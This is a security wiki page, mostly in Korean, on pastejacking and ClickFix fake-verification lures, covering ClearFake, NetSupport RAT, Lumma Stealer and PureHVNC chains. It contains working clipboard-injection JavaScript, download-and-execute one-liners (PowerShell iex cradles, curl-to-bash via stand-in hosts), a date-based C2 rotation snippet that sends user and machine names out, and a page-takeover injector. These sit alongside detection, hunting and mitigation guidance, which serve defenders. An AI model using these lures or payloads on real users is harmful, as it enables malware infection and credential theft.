# Clipboard Hijacking (Pastejacking) 공격

{{#include ../../banners/hacktricks-training.md}}

> "자신이 직접 복사하지 않은 것은 절대 붙여넣지 마라." – 오래됐지만 여전히 유효한 조언

## 개요

Clipboard hijacking – also known as *pastejacking* – 은 사용자가 명령을 검토하지 않고 일상적으로 복사-붙여넣기 한다는 점을 악용한다. 악의적인 웹 페이지(또는 Electron 등 JavaScript가 가능한 컨텍스트를 가진 Desktop 애플리케이션)는 프로그램적으로 공격자가 제어하는 텍스트를 시스템 클립보드에 넣는다. 피해자는 보통 정교한 social-engineering 지침에 따라 **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell)을 누르거나 터미널을 열고 클립보드 내용을 *붙여넣기* 하도록 유도되어 즉시 임의의 명령이 실행된다.

Because **no file is downloaded and no attachment is opened**, 이 기법은 attachments, macros 또는 직접 명령 실행을 모니터링하는 대부분의 이메일 및 웹 콘텐츠 보안 통제를 우회한다. 따라서 이 공격은 NetSupport RAT, Latrodectus loader 또는 Lumma Stealer 같은 상용 malware 계열을 배포하는 phishing 캠페인에서 인기가 있다.

## Forced copy buttons and hidden payloads (macOS 원라이너)

일부 macOS infostealers는 설치 사이트(e.g., Homebrew)를 복제하고 **“Copy” 버튼 사용을 강제**하여 사용자가 보이는 텍스트만 선택하지 못하게 만든다. 클립보드 항목에는 예상되는 설치 명령과 추가된 Base64 payload(e.g., `...; echo <b64> | base64 -d | sh`)가 포함되어 있어, 단일 붙여넣기만으로 두 단계가 모두 실행되며 UI는 추가 단계를 숨긴다.

## JavaScript 개념 증명
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake 흐름

1. 사용자가 typosquatted 또는 compromised 사이트(예: `docusign.sa[.]com`)를 방문한다.
2. 주입된 **ClearFake** JavaScript는 `unsecuredCopyToClipboard()` 헬퍼를 호출하여 Base64로 인코딩된 PowerShell one-liner를 클립보드에 무음으로 저장한다.
3. HTML 지침은 피해자에게 다음을 지시한다: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe`이 실행되어 합법적인 실행파일과 악성 DLL을 포함한 아카이브를 다운로드한다 (classic DLL sideloading).
5. loader가 추가 단계를 복호화하고, shellcode를 주입하며 persistence(예: scheduled task)를 설치한다 — 궁극적으로 NetSupport RAT / Latrodectus / Lumma Stealer를 실행한다.

### 예시: NetSupport RAT 체인
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (정상적인 Java WebStart)은 자신의 디렉터리에서 `msvcp140.dll`을 검색합니다.
* 악성 DLL은 **GetProcAddress**로 API를 동적으로 해석하고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드한 뒤, rolling XOR key `"https://google.com/"`로 복호화하고 최종 shellcode를 인젝션한 후 **client32.exe** (NetSupport RAT)를 `C:\ProgramData\SecurityCheck_v1\`에 압축 해제합니다.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**로 `la.txt` 다운로드
2. **cscript.exe** 안에서 JScript downloader를 실행함
3. MSI payload를 가져옴 → 서명된 애플리케이션 옆에 `libcef.dll`을 드롭함 → DLL sideloading → shellcode → Latrodectus.

### MSHTA를 통한 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 호출은 숨겨진 PowerShell 스크립트를 실행해 `PartyContinued.exe`를 가져오고, `Boat.pst` (CAB)를 추출하며 `extrac32`와 file concatenation을 통해 `AutoIt3.exe`를 재구성한 뒤 최종적으로 `.a3x` 스크립트를 실행하여 browser credentials를 `sumeriavgv.digital`로 유출합니다.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 건너뛰고 피해자에게 WSH를 통해 JavaScript를 가져와 실행하는 one‑liner를 붙여넣도록 지시하며, 이를 영구화(persist)하고 C2를 매일 회전(rotate)시킵니다. 관찰된 예시 체인:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
핵심 특징
- 난독화된 URL을 런타임에 역순으로 처리하여 간단한 검사로부터 회피.
- JavaScript는 Startup LNK (WScript/CScript)를 통해 자신을 지속시키며, 현재 날짜에 따라 C2를 선택 — 빠른 domain 회전을 가능하게 함.

날짜에 따라 C2s를 회전시키는 데 사용된 최소 JS 코드 조각:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
다음 단계에서는 일반적으로 영구성을 확보하고 RAT (예: PureHVNC)을 풀링하는 로더를 배포합니다. 종종 TLS를 하드코딩된 인증서에 고정(pinning)하고 트래픽을 청크 단위로 전송합니다.

Detection ideas specific to this variant
- 프로세스 트리: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (또는 `cscript.exe`).
- 시작 아티팩트: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`의 LNK가 `%TEMP%`/`%APPDATA%` 아래의 JS 경로로 WScript/CScript를 호출.
- Registry/RunMRU 및 명령행 텔레메트리에 `.split('').reverse().join('')` 또는 `eval(a.responseText)` 포함.
- 긴 명령행 없이 긴 스크립트를 전달하기 위해 큰 stdin 페이로드와 함께 반복적으로 실행되는 `powershell -NoProfile -NonInteractive -Command -`.
- 이후에 LOLBins를 실행하는 Scheduled Tasks — 예: 업데이트처럼 보이는 작업/경로(예: `\GoogleSystem\GoogleUpdater`) 아래에서 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` 실행.

Threat hunting
- `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 패턴을 가진 일별 교체되는 C2 호스트명 및 URL.
- 클립보드 쓰기 이벤트가 Win+R 붙여넣기 후 즉시 `powershell.exe` 실행으로 이어지는지 상관관계 분석.

블루팀은 클립보드, 프로세스 생성 및 레지스트리 텔레메트리를 결합해 pastejacking 남용을 정확히 찾아낼 수 있습니다:

* Windows 레지스트리: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`는 **Win + R** 명령의 기록을 보관합니다 – 의심스러운 Base64 / 난독화된 항목을 확인하세요.
* Security Event ID **4688** (Process Creation)에서 `ParentImage` == `explorer.exe` 이고 `NewProcessName`가 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } 중 하나인 경우.
* 의심스러운 4688 이벤트 직전에 `%LocalAppData%\Microsoft\Windows\WinX\` 또는 임시 폴더에서의 파일 생성에 대한 Event ID **4663**.
* EDR 클립보드 센서(있는 경우) – `Clipboard Write` 직후 새 PowerShell 프로세스가 생성되는지 상관관계 분석.

## IUAM-style verification pages (ClickFix Generator): 클립보드 복사→콘솔 + OS 인식 페이로드

최근 캠페인들은 가짜 CDN/브라우저 검증 페이지("Just a moment…", IUAM-style)를 대량으로 생성하여 사용자가 클립보드의 OS별 명령을 네이티브 콘솔에 복사하도록 강요합니다. 이는 브라우저 샌드박스 밖으로 실행을 전이시키며 Windows와 macOS 전반에서 작동합니다.

Key traits of the builder-generated pages
- `navigator.userAgent`를 통한 OS 감지로 페이로드를 맞춤화(Windows PowerShell/CMD vs. macOS Terminal). 지원되지 않는 OS에 대해서는 환상을 유지하기 위해 선택적 미끼/무효 동작(decoys/no-ops)을 제공.
- 무해해 보이는 UI 동작(체크박스/Copy)에서 자동으로 클립보드 복사를 수행하되, 표시되는 텍스트와 클립보드 내용이 다를 수 있음.
- 모바일 차단 및 단계별 지침이 포함된 팝오버: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- 선택적 난독화 및 단일 파일 인젝터로 손상된 사이트의 DOM을 Tailwind 스타일의 검증 UI로 덮어쓰기(새 도메인 등록 불필요).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 초기 실행에서의 persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`를 사용하면 터미널이 닫힌 후에도 실행이 계속되어 눈에 띄는 artifacts를 줄일 수 있습니다.

In-place page takeover (침해된 사이트에서)
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: 검증 위젯에 Clipboard API를 바인딩하는 페이지; 화면에 표시된 텍스트와 클립보드 페이로드의 불일치; `navigator.userAgent` 분기; 의심스러운 상황에서 Tailwind + single-page 교체.
- Windows endpoint: 브라우저 상호작용 직후 `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%`에서 실행되는 batch/MSI 설치 프로그램.
- macOS endpoint: 브라우저 이벤트 근처에서 Terminal/iTerm이 `bash`/`curl`/`base64 -d`를 `nohup`과 함께 실행; 터미널 종료 후에도 살아있는 백그라운드 작업.
- `RunMRU` Win+R 기록 및 클립보드 기록을 이후 콘솔 프로세스 생성과 상관분석.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake는 WordPress 사이트를 계속 침해하고 로더 JavaScript를 주입하여 외부 호스트(Cloudflare Workers, GitHub/jsDelivr)와 연쇄적으로 연결하고, 심지어 blockchain “etherhiding” 호출(예: `bsc-testnet.drpc[.]org` 같은 Binance Smart Chain API 엔드포인트로의 POST)을 통해 현재 유인 로직을 가져옵니다. 최근 오버레이는 사용자가 어떤 파일도 다운로드하지 않고 한 줄짜리 명령어( T1204.004)를 복사/붙여넣기하도록 지시하는 fake CAPTCHA를 대거 사용합니다.
- 초기 실행은 점점 서명된 스크립트 호스트/LOLBAS에 위임되고 있습니다. 2026년 1월 체인에서는 이전의 `mshta` 사용을 `WScript.exe`로 실행되는 내장 `SyncAppvPublishingServer.vbs`로 교체했으며, 원격 콘텐츠를 가져오기 위해 aliases/wildcards를 포함한 PowerShell-유사 인수를 전달합니다:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs`는 서명되어 있으며 일반적으로 App-V에서 사용된다; `WScript.exe`와 비정상적인 인수(`gal`/`gcm` aliases, 와일드카드가 적용된 cmdlets, jsDelivr URLs)와 결합되면 ClearFake에 대한 높은 신호의 LOLBAS 단계가 된다.
- 2026년 2월 가짜 CAPTCHA 페이로드는 순수 PowerShell 다운로드 크래들로 다시 이동했다. 두 가지 실제 예:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 첫 번째 체인은 인메모리 `iex(irm ...)` grabber이고, 두 번째는 `WinHttp.WinHttpRequest.5.1`을 통해 스테이징하여 임시 `.ps1` 파일을 쓰고 숨겨진 창에서 `-ep bypass`로 실행합니다.

이 변형들에 대한 탐지/헌팅 팁
- 프로세스 계보: 브라우저 → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` 또는 PowerShell cradles가 클립보드 쓰기/Win+R 직후에 이어짐.
- 명령줄 키워드: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, 또는 raw IP `iex(irm ...)` 패턴.
- 네트워크: 웹 브라우징 직후 스크립트 호스트/PowerShell에서 CDN worker 호스트 또는 blockchain RPC endpoints로의 아웃바운드.
- 파일/레지스트리: `%TEMP%` 아래 임시 `.ps1` 생성 및 해당 원라이너를 포함한 RunMRU 항목; 외부 URL이나 난독화된 alias 문자열과 함께 실행되는 signed-script LOLBAS (WScript/cscript/mshta)에 대해 차단/경보.

## 완화 조치

1. 브라우저 강화 – 클립보드 쓰기 접근(`dom.events.asyncClipboard.clipboardItem` 등) 비활성화하거나 사용자 제스처 필요하도록 설정.
2. 보안 인식 – 사용자가 민감한 명령어를 *타이핑*하거나 먼저 텍스트 편집기에 붙여넣도록 교육하세요.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control을 사용해 임의의 원라이너 차단.
4. 네트워크 제어 – 알려진 pastejacking 및 악성코드 C2 도메인으로의 아웃바운드 요청 차단.

## 관련 트릭

* **Discord Invite Hijacking**은 사용자를 악성 서버로 유인한 후 동일한 ClickFix 방식을 자주 악용합니다:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 참고자료

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
